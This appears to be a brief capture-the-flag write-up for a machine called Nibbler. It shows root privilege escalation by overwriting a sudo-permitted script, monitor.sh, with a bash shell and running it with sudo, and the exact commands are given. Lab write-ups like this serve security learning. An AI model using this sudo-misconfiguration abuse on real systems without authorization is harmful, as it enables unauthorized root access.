We go through service HTTP (port 80), once we get RCE as nibbler user we can create a sh script in `/home/nibbler/personal/stuff/monitor.sh` (seen with `sudo -l` command) and place a shell like this:

```bash
#!/bin/bash
/bin/bash
```

We give the script execute permissions and we can get a shell as root:

```bash
$ echo -e '#!/bin/bash\n/bin/bash' > monitor.sh
$ chmod +x monitor.sh
$ sudo /home/nibbler/personal/stuff/monitor.sh
```
